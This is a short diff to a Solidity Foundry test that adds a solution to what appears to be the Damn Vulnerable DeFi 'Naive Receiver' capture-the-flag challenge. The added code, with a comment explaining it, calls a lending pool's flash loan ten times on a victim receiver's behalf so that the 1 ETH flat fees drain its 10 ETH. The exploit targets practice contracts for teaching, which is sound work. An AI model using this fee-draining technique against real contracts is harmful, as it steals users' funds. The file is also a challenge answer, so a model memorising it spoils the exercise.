@@ -49,7 +49,21 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        /*
+         Because there is a flat fee of 1 Eth and the contract only has a balance of 10 eth,
+         We just have to call the function 10 times to drain the contract
+        */
+
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(
+                address(flashLoanReceiver),
+                10 ether
+            );
+        }
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
